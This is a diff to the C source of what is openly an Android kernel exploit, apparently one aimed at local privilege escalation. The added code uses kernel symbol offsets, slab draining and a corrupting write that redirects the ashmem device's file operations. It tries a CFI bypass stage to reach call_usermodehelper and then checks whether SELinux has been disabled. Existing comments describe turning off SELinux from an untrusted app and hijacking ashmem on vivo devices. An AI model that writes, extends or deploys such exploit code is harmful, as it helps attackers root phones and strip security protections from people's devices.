@@ -947,6 +947,26 @@ int run_exploit(int argc, char **argv) {
   timer_reset();
   TIMER("exploit start");
 
+  int selinux_ok = check_selinux_off();
+  int umh_available = active_offsets &&
+      active_offsets->off_system_unbound_wq &&
+      active_offsets->off_call_usermodehelper_exec_work &&
+      active_offsets->off_ashmem_misc_fops;
+
+  if (!selinux_ok && umh_available) {
+    pr_info("UMH path: fops redirect (mode=4)...\n");
+    slab_drain();
+    TIMER("pre-UMH drain");
+    int fops_routed = do_one_write(
+        data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4, 0);
+    if (fops_routed && try_cfi_stage()) {
+      pr_success("UMH path: CFI/UMH stage completed\n");
+      selinux_ok = check_selinux_off();
+    } else {
+      pr_warning("UMH path: mode 4 unavailable or failed; continuing with W1\n");
+    }
+  }
+
   if (is_vivo()) {
     init_ashmem_path();
     g_hijack_fd = open_ashmem_device();
@@ -962,7 +982,6 @@ int run_exploit(int argc, char **argv) {
 
   /* W1: disable SELinux before task discovery. untrusted_app may not be able
    * to read enforce while it is still enforcing, so attempt W1 regardless. */
-  int selinux_ok = check_selinux_off();
   if (!selinux_ok) {
     if (!enforce_readable()) {
       pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
